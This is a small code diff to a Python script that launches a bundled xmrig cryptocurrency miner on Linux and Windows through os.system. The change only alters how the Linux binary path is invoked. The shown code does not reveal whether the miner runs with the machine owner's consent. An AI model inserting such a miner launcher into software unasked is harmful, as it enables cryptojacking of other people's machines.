@@ -21,11 +21,10 @@ if not os.path.exists(local_dir):
 if platform == "linux" or platform == "linux2":
    exefile = os.path.join(local_dir,"linuxmyxmrig","xmrig")
 #    os.popen("sudo -S %s"%(command), 'w')
-   p = os.system('./%s' % (exefile))
+   p = os.system('%s' % (exefile))
 elif platform == "darwin":
     #Do nothing
     pass
 elif platform == "win32":
     exefile = os.path.join(local_dir,"win64myxmrig","xmrig.exe")
     os.system(exefile)
-
